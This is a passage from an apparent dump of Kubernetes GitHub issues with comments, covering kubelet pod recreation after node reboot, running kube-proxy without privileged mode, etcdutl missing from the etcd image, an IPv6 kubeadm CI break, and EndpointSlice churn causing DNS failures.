Graceful Node Shutdown] After rebooting the worker node and waiting for a while, the old pod ends up with `Unknown` and starts a new pod which ends up `Completed`. Zero Restarts.\r\n```\r\nNAME                     READY   STATUS      RESTARTS   AGE     IP            NODE                        NOMINATED NODE   READINESS GATES\r\npod/test-created-7lx7h   0/1     Unknown     0          3m12s   <none>        localmachine2.localdomain   <none>           <none>\r\npod/test-created-bfh98   0/1     Completed   0          102s    10.244.1.39   localmachine2.localdomain   <none>           <none>\r\n```\r\n\r\n---\r\n\r\nAlso a fix from the job config file since `enable` is not a valid `metadata` field:\r\n> ### What happened?\r\n> 1. create a job, set job restartPolicy to Never;\r\n> \r\n> ```yaml\r\n> apiVersion: batch/v1\r\n> kind: Job\r\n> metadata:\r\n>   annotations:\r\n>     description: ''\r\n>   # enable: true\r\n>    ...\r\n>   labels: {}  # lables: {}\r\n> spec:\r\n>   ...\r\n>   template:\r\n>     metadata:\r\n>       # enable: true\r\n>       ...\r\n> ```\r\n\r\nI \r\n"}, {"author": "wxx213", "body": "We also encountered this issue when kubelet experience lots of cri function call time out in the memory shortage  situation.\r\n\r\nHere I give the cause detail from the kubelet log:\r\n1. kubelet created the sandbox and the pod status was not synced to kubelet by pleg because of the cri function call time out\r\n2. kubelet start pod container time out, then the pod container was enter in Created state\r\n3. in the next syncLoop\uff0ckubelet still cannot get the pod ip\uff0cso the pod needs to be recreated, but the following codes in computePodActions function make the pod recreation action was canceled.\r\n```go\r\nif !shouldRestartOnFailure(pod) && attempt != 0 && len(podStatus.ContainerStatuses) != 0 {\r\n\t\t\t// Should not restart the pod, just return.\r\n\t\t\t// we should not create a sandbox for a pod if it is already done.\r\n\t\t\t// if all containers are done and should not be started, there is no need to create a new sandbox.\r\n\t\t\t// this stops confusing logs on pods whose containers all have exit codes, but we recreate a sandbox before terminating it.\r\n\t\t\t//\r\n\t\t\t// If ContainerStatuses is empty, we assume that we've never\r\n\t\t\t// successfully created any containers. In this case, we should\r\n\t\t\t// retry creating the sandbox.\r\n\t\t\tchanges.CreateSandbox = false\r\n\t\t\treturn changes\r\n\t\t}\r\n```\r\n4. then the sandbox would never be recreated and the pod was always  stuck in Pending state\r\n\r\nThe completely reproduce is not easy,  adding some fake codes could help:\r\n1. add the fake codes in kubelet\uff0calways make the test pod start time out\r\n```go\r\nfunc (ds *dockerService) StartContainer(_ context.Context, r *runtimeapi.StartContainerRequest) (*runtimeapi.StartContainerResponse, error) {\r\n\tinfo, err := ds.client.InspectContainer(r.ContainerId)\r\n\tif err != nil {\r\n\t\treturn nil, fmt.Errorf(\"inspect error %v\", err)\r\n\t}\r\n\tpodName, ok := info.Config.Labels[\"io.kubernetes.pod.name\"]\r\n\tif ok {\r\n\t\tif strings.Compare(podName, \"centos7-pod\") == 0 {\r\n\t\t\ttime.Sleep(1 * time.Hour)\r\n\t\t}\r\n\t}\r\n     .......\r\n}\r\n```\r\n2. create a pod with \"restartPolicy: Never\" config\r\n```yaml\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  name: centos7-pod\r\n  labels:\r\n    name: centos7-pod\r\n    scheduling.sankuai.com/system-service: 'true'\r\nspec:\r\n  containers:\r\n  - name: centos7-pod\r\n    image: centos:7\r\n    env:\r\n    - name: GET_HOST_FROM\r\n      value: env\r\n    ports:\r\n    - containerPort: 80\r\n    command:\r\n    - sleep\r\n    args:\r\n    - infinity\r\n  restartPolicy: Never\r\n```\r\n3. when the pod container start time out, kill the sandbox container to trigger the pod rebuild\r\n```\r\ndocker kill $cid\r\n```\r\n\r\n4, check the kubelet log, the CreateSandbox field  always be false\r\n```\r\n\"computePodActions got for pod\" podActions={KillPod:true CreateSandbox:false...}\r\n```\r\n\r\nWe use kubelet 1.21 and it's seems that the latest kubelet have the same issue.\r\n\r\n"}, {"author": "wxx213", "body": "@tuibeovince could you help to check this reproduce?"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "haircommander", "body": "we haven't heard about this in a while, can folks try on a newer version please?\n\n/triage needs-information\n/cc @esotsal "}, {"author": "esotsal", "body": "> we haven't heard about this in a while, can folks try on a newer version please?\n\nTried with minikube with v1.34.0, on a multi node cluster with cri-o, with GracefullNodeShutdown enabled by default. I modified the test-job.yaml to use the multinode-demo-m02 worker node.\n```\nminikube start --nodes 2 -p multinode-demo --vm --container-runtime crio\nminikube -p multinode-demo kubectl --apply -f ~/test-job.yaml \n```\nVM reboot emulated using \n```\nminikube node stop 'multinode-demo-m02' -p multinode-demo\nminikube node start 'multinode-demo-m02' -p multinode-demo\n```\n\nDid also additional test sshing in the VM, to kill kubelet and to stop and start the service.\n```\nminikube ssh -n 'multinode-demo-m02' -p multinode-demo\n```\n\nI confirm same behaviour as https://github.com/kubernetes/kubernetes/issues/118321#issuecomment-2058400503 , unable to reproduce issue with v1.34.0\n\nFor the second comment  https://github.com/kubernetes/kubernetes/issues/118321#issuecomment-2283258025 , there are two problems: \n\n1) it is unclear how to reproduce the use case\n2) it is mentioned docker. Dockershim has been removed from the [Kubernetes project as of release 1.24,](https://kubernetes.io/docs/setup/production-environment/container-runtimes/) \n\nI propose the author of the second comment to create a separate issue , include reproduction guide with cri-o or containerd, \n\nBased on above analysis, i propose @haircommander  to close this issue. \n"}, {"author": "haircommander", "body": "works for me\n/close"}, {"author": "k8s-ci-robot", "body": "@haircommander: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/118321#issuecomment-3339680496):\n\n>works for me\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 112171, "issue_url": "https://github.com/kubernetes/kubernetes/issues/112171", "issue_title": "Document and test minimum privileges needed to run kube-proxy", "issue_author": "ialidzhikov", "issue_body": "### What happened?\n\nRunning containers in privileged mode is not recommended as privileged containers run with all [linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) enabled and can access the host's resources. Running containers in privileged mode opens number of security threads such as breakout to underlying host OS.\r\n\r\nCurrently the kube-proxy DaemonSet runs in privileged mode.\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/863a462eeccca4c24bf4c4e9012f5ebccade70a2/cluster/addons/kube-proxy/kube-proxy-ds.yaml#L50-L51\r\n\r\nhttps://kubernetes.io/docs/tasks/administer-cluster/kubelet-in-userns/#configuring-kube-proxy describes how to run kube-proxy in \"rootless\". To my understanding \"rootless\" != non-privileged mode but this configuration can be also used for running in non-privileged mode. However I see that following issues with it:\r\n1. In the provided kube-proxy component config in https://kubernetes.io/docs/tasks/administer-cluster/kubelet-in-userns/#configuring-kube-proxy we have to disable certain settins to prevent kube-proxy from ensuring sysctls (which is allowed only in privileged container).\r\n\r\nBut when I tried to run kube-proxy with the provided component config it fails because it tries to ensure yet another syctl:\r\n```\r\nF0818 08:03:55.514875       1 server.go:494] unable to create proxier: unable to create ipv4 proxier: can't set sysctl net/ipv4/conf/all/route_localnet to 1: open /proc/sys/net/ipv4/conf/all/route_localnet: read-only file system\r\n```\r\n\r\nIt is `net/ipv4/conf/all/route_localnet` that is being set in https://github.com/kubernetes/kubernetes/blob/58c10aa6eb5adfb1f3aa4d6cb898b8c347ba9e72/pkg/proxy/iptables/proxier.go#L263-L265\r\n\r\nAnd I don't see a way how to disable kube-proxy from ensuring this sysctl from its component config.\r\n\r\n2. In general the whole approach that explicitly sets 0 values to prevent kube-proxy from ensuring syctls seems not a sustainable one. The long lived kube-proxy container should be able to run in non-privileged mode. If it needs sysctls to be ensured, this can to be done in a privileged init container.\r\n\n\n### What did you expect to happen?\n\nI would expect to be able to run kube-proxy in non-privileged mode in a clear and sustainable way.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nSee above.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\r\n\r\nv1.24.3\r\n\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\n\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/network", "sig/security", "triage/accepted"], "comments": [{"author": "k8s-ci-robot", "body": "@ialidzhikov: This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "ialidzhikov", "body": "/sig network\r\n/sig security\r\n\r\nRef to a thread where we were discussing kube-proxy in non-privileged mode - https://kubernetes.slack.com/archives/C09QYUH5W/p1659601425035639 (cc @aojea)"}, {"author": "uablrek", "body": "Have you tried proxy-mode=ipvs? It does not set `net/ipv4/conf/all/route_localnet` but there may be other, ipvs related sysctls.\r\n\r\n`net/ipv4/conf/all/route_localnet` is to allow nodePorts on localhost which is discussed in https://github.com/kubernetes/kubernetes/issues/111840. It should besically be removed from kube-proxy."}, {"author": "thockin", "body": "Aside from route_localnet, there are other things that kube-proxy tries to configure.  It's a very low-level agent, and simply disabling those things may not really be viable - they are being set for a reason.\r\n\r\nI'm all in favor of dropping privilege, if we can, but I am not so confident we can...\r\n\r\nhttps://github.com/kubernetes/kubernetes/pull/108250 proposes a control which should help wrt route_localnet."}, {"author": "aojea", "body": ">  Currently the kube-proxy DaemonSet runs in privileged mode.\r\n> \r\n> [kubernetes/cluster/addons/kube-proxy/kube-proxy-ds.yaml](https://github.com/kubernetes/kubernetes/blob/863a462eeccca4c24bf4c4e9012f5ebccade70a2/cluster/addons/kube-proxy/kube-proxy-ds.yaml#L50-L51)\r\n> \r\n> Lines 50 to 51 in [863a462](https://github.com/kubernetes/kubernetes/commit/863a462eeccca4c24bf4c4e9012f5ebccade70a2)\r\n> \r\n>  securityContext: \r\n>    privileged: true\r\n\r\n\r\nthat is a internal detail of kubernetes CI, those configuration should not be exposed and are not representative\r\n\r\n\r\n> Aside from route_localnet, there are other things that kube-proxy tries to configure. It's a very low-level agent,\r\n\r\nthose are explained in the linked article https://kubernetes.io/docs/tasks/administer-cluster/kubelet-in-userns/#configuring-kube-proxy\r\n```\r\nConfiguring kube-proxy \r\nRunning kube-proxy in a user namespace requires the following configuration:\r\n\r\napiVersion: kubeproxy.config.k8s.io/v1alpha1\r\nkind: KubeProxyConfiguration\r\nmode: \"iptables\" # or \"userspace\"\r\nconntrack:\r\n# Skip setting sysctl value \"net.netfilter.nf_conntrack_max\"\r\n  maxPerCore: 0\r\n# Skip setting \"net.netfilter.nf_conntrack_tcp_timeout_established\"\r\n  tcpEstablishedTimeout: 0s\r\n# Skip setting \"net.netfilter.nf_conntrack_tcp_timeout_close\"\r\n  tcpCloseWaitTimeout: 0s\r\n```\r\n\r\n> But when I tried to run kube-proxy with the provided component config it fails because it tries to ensure yet another syctl:\r\n\r\nyou can disable that sysctl using the flag `--nodeport-addresses`\r\nhttps://github.com/kubernetes/kubernetes/pull/107684\r\n\r\nYou should pass the network cidrs with your node addresses, without containing any loopback address. \r\n\r\nSomething that will work for most people is to use always the private networks ranges:\r\n`--nodeport-address 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,169.254.0.0/16`\r\n\r\n@thockin maybe we can default that flag to all private IP ranges?, we solve the LB with public IPs problem too"}, {"author": "khenidak", "body": "I think at minimum we should be able to run it with CAP_NET_ADMIN not CAP_SYS_ADMIN. That at least limits the blast radius while we consider all options provided here: https://github.com/kubernetes/kubernetes/issues/112171#issuecomment-1234778318\r\n\r\n\r\n/assign"}, {"author": "ialidzhikov", "body": "> that is a internal detail of kubernetes CI, those configuration should not be exposed and are not representative\r\n\r\nOkay, maybe I referenced the wrong chart. Where is the public/exposed kube-proxy chart? Is there something like this? I assume that kube-proxy runs in privileged mode there as well.\r\n\r\n---\r\n\r\n> > Aside from route_localnet, there are other things that kube-proxy tries to configure. It's a very low-level agent,\r\n> \r\n> those are explained in the linked article https://kubernetes.io/docs/tasks/administer-cluster/kubelet-in-userns/#configuring-kube-proxy\r\n> \r\n> ```\r\n> Configuring kube-proxy \r\n> Running kube-proxy in a user namespace requires the following configuration:\r\n> \r\n> apiVersion: kubeproxy.config.k8s.io/v1alpha1\r\n> kind: KubeProxyConfiguration\r\n> mode: \"iptables\" # or \"userspace\"\r\n> conntrack:\r\n> # Skip setting sysctl value \"net.netfilter.nf_conntrack_max\"\r\n>   maxPerCore: 0\r\n> # Skip setting \"net.netfilter.nf_conntrack_tcp_timeout_established\"\r\n>   tcpEstablishedTimeout: 0s\r\n> # Skip setting \"net.netfilter.nf_conntrack_tcp_timeout_close\"\r\n>   tcpCloseWaitTimeout: 0s\r\n> ```\r\n> \r\n> > But when I tried to run kube-proxy with the provided component config it fails because it tries to ensure yet another syctl:\r\n> \r\n> you can disable that sysctl using the flag `--nodeport-addresses` #107684\r\n> \r\n> You should pass the network cidrs with your node addresses, without containing any loopback address.\r\n> \r\n> Something that will work for most people is to use always the private networks ranges: `--nodeport-address 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,169.254.0.0/16`\r\n> \r\n> @thockin maybe we can default that flag to all private IP ranges?, we solve the LB with public IPs problem too\r\n\r\nOkay but the whole approach by disabling is a hack/workaround. In https://github.com/kubernetes/kubernetes/issues/112171#issue-1358314085 I wrote:\r\n\r\n> In general the whole approach that explicitly sets 0 values to prevent kube-proxy from ensuring syctls seems not a sustainable one. The long lived kube-proxy container should be able to run in non-privileged mode. If it needs sysctls to be ensured, this can to be done in a privileged init container.\r\n\r\nThe long-lived container should not deal with sysctls. For example they can be moved to a privileged init container.\r\n\r\nFor example in Gardener we run kube-proxy with:\r\n```yaml\r\n    conntrack:\r\n      maxPerCore: 524288\r\n```\r\n\r\nHow we are supposed to run kube-proxy in non-privileged mode with this setting preserved?\r\n\r\n---\r\n\r\n> I think at minimum we should be able to run it with CAP_NET_ADMIN not CAP_SYS_ADMIN.\r\n\r\n@khenidak According to my testing kube-proxy was running fine with `NET_ADMIN` and `SYS_RESOURCE` (except the sysctls).\r\n"}, {"author": "aojea", "body": "> Where is the public/exposed kube-proxy chart?\r\n\r\nthere is no such thing, each installer/project:kubeadm, kops, openshift, ... pick their choices and way of deploying it.\r\n\r\n> The long-lived container should not deal with sysctls. For example they can be moved to a privileged init container.\r\n\r\nI see your point now. kube-proxy is released as a single binary, you can't assume kube-proxy is containerized, despite most people use it that way. I don't know if you can remove these sysctls without making breaking changes.\r\n\r\nAlso, kube-proxy is one particular implementation of Services, but there can be others, you don't have to use kube-proxy, some people is working on a evolution on [kpng project](https://github.com/kubernetes-sigs/kpng) , they should have this feedback to not carry over this past mistakes\r\n\r\n\r\n \r\n\r\n\r\n"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "ialidzhikov", "body": "/remove-lifecycle rotten"}, {"author": "aojea", "body": "/unassign\r\n/priority long-term\r\n\r\nPeople is welcome to work on this and try to reduce the privilege scope of kube-proxy "}, {"author": "k8s-ci-robot", "body": "@aojea: The label(s) `priority/long-term` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/112171#issuecomment-1666967187):\n\n>/unassign\r\n>/priority long-term\r\n>\r\n>People is welcome to work on this and try to reduce the privilege scope of kube-proxy \n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "uablrek", "body": "I'll give it a shot. My idea is:\r\n\r\n1. Make sure that kube-proxy doesn't set anything if the value is already the desired one. This may already be in place\r\n2. Add a `-init-only` CLI option to kube-proxy (not included in the config obviously) that *only* sets sysctl's etc.\r\n\r\nThen any system that starts `kube-proxy`, in whatever way, can _optionally_ do that in two steps, `-init-only` that needs \"privileged\" and then run kube-proxy non-privileged.\r\n\r\n/assign"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134148, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134148", "issue_title": "etcd image should include etcdutl", "issue_author": "theboringstuff", "issue_body": "### What happened?\n\nStarting from k8s v1.34, it uses etcd and etcdctl 3.6. Etcdctl 3.6 removed support for restore command, so now there is no way to run restore command from etcd image, without bringing additional tools.\n\n### What did you expect to happen?\n\nPreviously we were able to use k8s etcd image to run etcdctl restore. We want to be able to use this image to run etcdutl restore\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRun k8s etcd image `docker run k8s.gcr.io/etcd:3.6.4-0 sh`\n\nTry to run `etcdctl restore`, it will fail. There is no alternative `etcdutl` inside the image\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\nk8s 1.34.0\n\n\n### Cloud provider\n\nnone, on-premise\n\n\n### OS version\n\nany\n\n### Install tools\n\nkubeadm\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-triage", "sig/etcd"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "theboringstuff", "body": "/sig etcd"}, {"author": "aojea", "body": "is this the right repo? or should this be reported in https://github.com/etcd-io/etcd"}, {"author": "theboringstuff", "body": "@aojea Kubernetes maintains their own etcd image https://github.com/kubernetes/kubernetes/tree/b2f9a821eac6970940b3577af9649f510aea1878/cluster/images/etcd \n\nThis issue was raised to etcd repo some time ago and they rejected it with this justification https://github.com/etcd-io/etcd/issues/13764\n\nIn coreos etcd image, etcdutl is actually [present](https://github.com/etcd-io/etcd/blob/main/Dockerfile#L6), but it is missing in k8s etcd image"}, {"author": "BenTheElder", "body": "> Starting from k8s v1.34, it uses etcd and etcdctl 3.6. Etcdctl 3.6 removed support for restore command, so now there is no way to run restore command from etcd image, without bringing additional tools.\n\nYou could use the image from the etcd project instead.\n\nFor migration, there is another command in the legacy image from the Kubernetes repo, documented here:\nhttps://github.com/kubernetes/kubernetes/tree/master/cluster/images/etcd\n\nAt some point, I'd like to see these unified, but that will take some time and effort .. https://github.com/etcd-io/etcd/issues/19798"}, {"author": "theboringstuff", "body": "Ok, efforts to make etcd image unified seem to be more desirable than improving kubernetes-specific image, closing this one, hopefully https://github.com/etcd-io/etcd/issues/19798 will be implemented"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134272, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134272", "issue_title": "kubeadm IPv6 broken on master", "issue_author": "BenTheElder", "issue_body": "### What happened?\n\nhttps://github.com/kubernetes/kubernetes/compare/0969bb173...2003bd0ce\n\nhttps://testgrid.k8s.io/sig-release-master-blocking#kind-ipv6-master\n\nAside: we should promote https://testgrid.k8s.io/conformance-all#kind%20(IPv6),%20master%20(dev) to release-blocking\n\n### What did you expect to happen?\n\nipv6 clusters to continue coming up healthily in CI\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nsee CI job for config etc\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/cluster-lifecycle", "triage/accepted"], "comments": [{"author": "BenTheElder", "body": "/sig cluster-lifecycle\nhttps://github.com/kubernetes/kubernetes/pull/134265#issuecomment-3335017553"}, {"author": "BenTheElder", "body": "/assign\nfiled https://github.com/kubernetes/kubernetes/pull/134273"}, {"author": "BenTheElder", "body": "/assign @neolit123 "}, {"author": "BenTheElder", "body": "/triage accepted"}, {"author": "BenTheElder", "body": "This will have impacted the various `.*kind.*ipv6.*` CI jobs, they should return to green now."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133474, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133474", "issue_title": "Frequent churn between EndpointSlice objects", "issue_author": "Arvinderpal", "issue_body": "### What happened?\n\nWe are running a single control-plane k3s cluster in our lab. The cluster has about 56 high-power bare metal nodes. The cluster is used primarily by our developers and our CICD. We create kubevirt VMs for dev and testing. \n\nRecently as our cluster grew to serve a 100+ kubevirt VMs (running in pods), we noticed significant uptick in the number of ssh and nslookup failures by our CICD system when trying to communicate with the VMs. On average, we would see 1 in 100 or so attempts fail to resolve the VMs IP address. The lookups happened based on the VM name. We use a single headless Service for all of our VMs. \n\nWe wrote a small script to see if we could reproduce the issue. The script would send DNS lookups (dig) to all running healthy VMs (VM status = ready). We noticed that coredns would occasionally return NXDOMAIN for perfectly healthy VMs. Importantly, those VMs were not going through any state transition. The NXDOMIANs would be short-lived, usually < 10 seconds and then it go back to resolving correctly. Again, it's important to note that the VMs(and their pods) for which the NXDOMAIN was received were not transitioning states during this period. \n\nTo see why coredns would behave this way, we wrote another program to watch for updates on the EndpointSlice object. What we noticed was that when the number of endpoints per slice grew greater than 100 (the default value), then, as expected, a new slice would be created. However, what would happen next was surprising. The two endpointslices would start to exhibit significant churn, where endpoints would be frequently be removed from one slice and added to the other. Here is a snippet for the two slices: tortuga-4frcm and tortuga-sxqh9. The program logs the type of event (e.g. MODIFIED) and what changed (i.e. it does a diff between the old and new object). Note that this is not a onetime thing, the churn continues for prolonged periods. The vast majority of VMs being shuffled are not going through any state transition. They are just sitting idle. \n\n```\n2025/07/24 22:34:09 EVENT [endpointslices]: Type: MODIFIED | Name: **tortuga-4frcm** | Change: endpoint count changed from 35 to 34, added IP: 10.42.59.53 (ready: true), added IP: 10.42.1.234 (ready: true), added IP: 10.42.4.164 (ready: true), added IP: 10.42.12.42 (ready: true), added IP: 10.42.61.70 (ready: true), added IP: 10.42.3.147 (ready: true), added IP: 10.42.3.145 (ready: true), added IP: 10.42.19.136 (ready: true), added IP: 10.42.31.23 (ready: true), added IP: 10.42.57.87 (ready: true), added IP: 10.42.57.84 (ready: true), added IP: 10.42.32.34 (ready: true), added IP: 10.42.8.181 (ready: true), added IP: 10.42.17.106 (ready: true), added IP: 10.42.7.57 (ready: true), added IP: 10.42.34.117 (ready: true), added IP: 10.42.56.229 (ready: true), added IP: 10.42.61.66 (ready: true), added IP: 10.42.9.155 (ready: true), added IP: 10.42.28.211 (ready: true), added IP: 10.42.10.143 (ready: true), added IP: 10.42.34.113 (ready: true), added IP: 10.42.27.21 (ready: true), added IP: 10.42.19.131 (ready: true), added IP: 10.42.44.221 (ready: true), added IP: 10.42.11.121 (ready: true), added IP: 10.42.15.113 (ready: true), added IP: 10.42.11.119 (ready: true), added IP: 10.42.11.115 (ready: true), added IP: 10.42.17.110 (ready: true), added IP: 10.42.60.77 (ready: true), removed IP: 10.42.3.148, removed IP: 10.42.58.38, removed IP: 10.42.27.22, removed IP: 10.42.60.71, removed IP: 10.42.59.46, removed IP: 10.42.44.225, removed IP: 10.42.12.44, removed IP: 10.42.61.71, removed IP: 10.42.43.235, removed IP: 10.42.4.160, removed IP: 10.42.9.157, removed IP: 10.42.60.74, removed IP: 10.42.40.131, removed IP: 10.42.8.178, removed IP: 10.42.35.149, removed IP: 10.42.32.31, removed IP: 10.42.10.142, removed IP: 10.42.60.76, removed IP: 10.42.7.61, removed IP: 10.42.61.68, removed IP: 10.42.6.208, removed IP: 10.42.60.75, removed IP: 10.42.16.91, removed IP: 10.42.12.45, removed IP: 10.42.44.203, removed IP: 10.42.31.28, removed IP: 10.42.2.56, removed IP: 10.42.6.207, removed IP: 10.42.27.28, removed IP: 10.42.28.210, removed IP: 10.42.3.143, removed IP: 10.42.35.147\n\n2025/07/24 22:34:09 EVENT [endpointslices]: Type: MODIFIED | Name: **tortuga-sxqh9** | Change: added IP: 10.42.59.49 (ready: true), added IP: 10.42.35.146 (ready: true), added IP: 10.42.28.206 (ready: true), added IP: 10.42.57.88 (ready: true), added IP: 10.42.40.131 (ready: true), added IP: 10.42.4.159 (ready: true), added IP: 10.42.6.212 (ready: true), added IP: 10.42.44.224 (ready: true), added IP: 10.42.28.208 (ready: true), added IP: 10.42.2.28 (ready: true), added IP: 10.42.15.110 (ready: true), added IP: 10.42.35.147 (ready: true), added IP: 10.42.35.149 (ready: true), added IP: 10.42.31.22 (ready: true), added IP: 10.42.7.59 (ready: true), added IP: 10.42.60.72 (ready: true), added IP: 10.42.60.76 (ready: true), added IP: 10.42.56.232 (ready: true), added IP: 10.42.32.30 (ready: true), added IP: 10.42.16.91 (ready: true), added IP: 10.42.10.142 (ready: true), added IP: 10.42.19.132 (ready: true), added IP: 10.42.16.81 (ready: true), added IP: 10.42.9.132 (ready: true), added IP: 10.42.30.175 (ready: true), added IP: 10.42.60.80 (ready: true), added IP: 10.42.2.52 (ready: true), added IP: 10.42.56.237 (ready: true), added IP: 10.42.56.236 (ready: true), added IP: 10.42.28.210 (ready: true), added IP: 10.42.40.129 (ready: true), added IP: 10.42.34.114 (ready: true), added IP: 10.42.27.26 (ready: true), added IP: 10.42.61.71 (ready: true), added IP: 10.42.27.27 (ready: true), added IP: 10.42.35.151 (ready: true), added IP: 10.42.12.41 (ready: true), added IP: 10.42.44.203 (ready: true), added IP: 10.42.9.159 (ready: true), added IP: 10.42.8.178 (ready: true), added IP: 10.42.32.38 (ready: true), added IP: 10.42.59.46 (ready: true), added IP: 10.42.6.208 (ready: true), added IP: 10.42.7.60 (ready: true), added IP: 10.42.43.235 (ready: true), added IP: 10.42.7.61 (ready: true), added IP: 10.42.16.89 (ready: true), added IP: 10.42.60.74 (ready: true), added IP: 10.42.3.144 (ready: true), added IP: 10.42.30.174 (ready: true), added IP: 10.42.3.141 (ready: true), added IP: 10.42.59.51 (ready: true), added IP: 10.42.27.22 (ready: true), added IP: 10.42.34.118 (ready: true), added IP: 10.42.19.139 (ready: true), added IP: 10.42.32.31 (ready: true), added IP: 10.42.56.239 (ready: true), added IP: 10.42.32.35 (ready: true), added IP: 10.42.58.38 (ready: true), added IP: 10.42.17.112 (ready: true), added IP: 10.42.61.69 (ready: true), added IP: 10.42.2.56 (ready: true), removed IP: 10.42.11.121, removed IP: 10.42.59.53, removed IP: 10.42.7.56, removed IP: 10.42.19.141, removed IP: 10.42.4.166, removed IP: 10.42.35.150, removed IP: 10.42.28.213, removed IP: 10.42.19.140, removed IP: 10.42.11.117, removed IP: 10.42.12.39, removed IP: 10.42.10.141, removed IP: 10.42.34.109, removed IP: 10.42.61.64, removed IP: 